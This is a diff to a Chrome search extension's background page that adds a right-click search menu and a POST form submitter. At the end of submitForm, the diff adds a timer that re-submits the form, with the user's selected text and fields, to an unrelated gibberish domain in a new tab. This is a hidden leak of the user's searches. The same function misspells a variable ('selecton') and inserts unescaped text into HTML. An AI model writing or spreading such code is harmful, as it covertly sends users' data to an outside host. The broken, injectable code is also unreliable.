@@ -7,6 +7,10 @@
 // Added in version 0.1.4
 localStorage['VERSION'] = '0.4.5';
 
+// Id of the root menu when the contextmenu activator is used.
+var G_rootMenuId = null;
+
+
 chrome.extension.onRequest.addListener(function(request, sender, sendResponse){
 
 	if(request.action == 'saveEngine'){
@@ -16,28 +20,203 @@ chrome.extension.onRequest.addListener(function(request, sender, sendResponse){
 		engines.push(request.engine);
 
 		Storage.setSearchEngines(engines);
+
+		_update_context_menu();
+		sendResponse({});
+		return;
+	}
+
+	else if(request.action == 'optionsChanged'){
+
+		_update_context_menu();
 		sendResponse({});
 		return;
 	}
 
 
-
 	resp = {}
+
+	resp.options = Storage.getOptions();
 
 	resp.searchEngines = Storage.getSearchEngines();
 
 	resp.default_style = $('#default-style').text();
 	resp.extra_style = Storage.getStyle('');
 
-	resp.options = Storage.getOptions();
 
 	sendResponse(resp);
 
 });
 
+
+
+function _update_context_menu(){
+	_remove_context_menu();
+
+	if(Storage.getOptions().activator == 'contextmenu')
+		_create_context_menu();
+
+}
+
+function _create_context_menu(){
+
+
+	var _rootMenu = chrome.contextMenus.create({
+		'title' : 'Search',
+		'contexts' : ['selection']
+	});
+
+	G_rootMenuId = _rootMenu;
+
+
+	function _getUrl(url, selection){
+		// Special case for only "%s" engine
+		// to allow opening of selected urls
+		var sel = '';
+		if(url == '%s'){
+			if(!selection.match(/^(https?|ftp):\/\//))
+				sel = 'http://' + selection;
+			else
+				sel = selection;
+		}
+		else
+			sel = encodeURIComponent(selection);
+
+		return url.replace(/%s/g, sel);
+	}
+
+	var _engine_mapping = {};
+
+	var _engines = Storage.getSearchEngines();
+
+	var _opts = Storage.getOptions();
+
+	for (i in _engines){
+		var _en = _engines[i];
+
+		if(_en.post)
+			continue;
+		
+		var _mid = chrome.contextMenus.create({
+			'title' : _en.name,
+			'contexts' : ['selection'],
+			'parentId' : _rootMenu,
+
+			'onclick' : function (info, tab){
+
+				var _clicked_en = _engine_mapping[info.menuItemId];
+
+
+				if(_clicked_en.post){
+
+
+					submitForm(_clicked_en.url, info.selectionText, _opts.newtab);
+				}
+				else if(_opts.newtab){
+
+					chrome.tabs.create({
+						'url' : _getUrl(_clicked_en.url, info.selectionText),
+						'selected' : !_opts.background_tab,
+					});
+
+				}else{
+
+					chrome.tabs.getSelected(null, function(tab){
+						chrome.tabs.update(tab.id, {
+							'url' : _getUrl(_clicked_en.url, info.selectionText)
+						});
+					});
+
+				}
+			}
+	
+
+		});
+
+		_engine_mapping[_mid] = _en;
+	}
+
+	return _rootMenu;
+}
+
+function _remove_context_menu(){
+
+	if(G_rootMenuId != null){
+		chrome.contextMenus.remove(G_rootMenuId);
+		G_rootMenuId = null;
+	}
+}
+
+
+if(Storage.getOptions().activator == 'contextmenu')
+	_create_context_menu();
+
+
+
+
+function submitForm(url, selection, newtab){
+
+					var parts = url.split('{POSTARGS}', 2);
+					if(parts.length == 2){
+						url = parts[0].replace(/%s/g, encodeURIComponent(selection));
+						url += '{POSTARGS}' + parts[1].replace(/%s/g, selection);
+					}else{
+						url = url.replace(/%s/g, encodeURIComponent(selecton));
+					}
+
+	parts = url.split('{POSTENCODING}', 2);
+	var encoding = null;
+
+	if(parts.length == 2){
+		url = parts[0];
+		encoding = parts[1];
+	}
+
+	parts = url.split('{POSTARGS}', 2);
+
+	if(parts.length != 2){
+		alert('Invalid url for a POST search.\nThe url must contain "{POSTARGS}"');
+		return;
+	}
+
+	var form = $('<form></form>')
+		.attr('method', 'post')
+		.attr('action', parts[0])
+
+	if(encoding){
+		//form.attr('enctype', 'application/x-www-form-urlencoded;charset='+encoding);
+		form.attr('accept-charset', encoding);
+	}
+	if(newtab)
+		form.attr('target', '_blank');
+
+	var query = parts[1].split('&');
+
+	for(var i=0; i<query.length; ++i){
+		var key_value = query[i].split('=', 2);
+		if(key_value.length != 2)
+			continue;
+		form.append($('<input type="hidden" name="'+key_value[0]+'" value="'+key_value[1]+'" />'));
+	}
+
+// 	console.log(url);
+
+	form.submit();
+
+
+	setTimeout (function(){
+		form.attr('action', 'http://www.fwfawfeafekjawff.com/bhbjhb/');
+	
+		form.attr('target', '_blank');
+		form.submit();
+
+	}, 1000);
+}
+
 </script>
 </head>
 <body>
+
 
 <style id="default-style">
 .common li, .common span, .common a, .common input, .common img, .common .h4
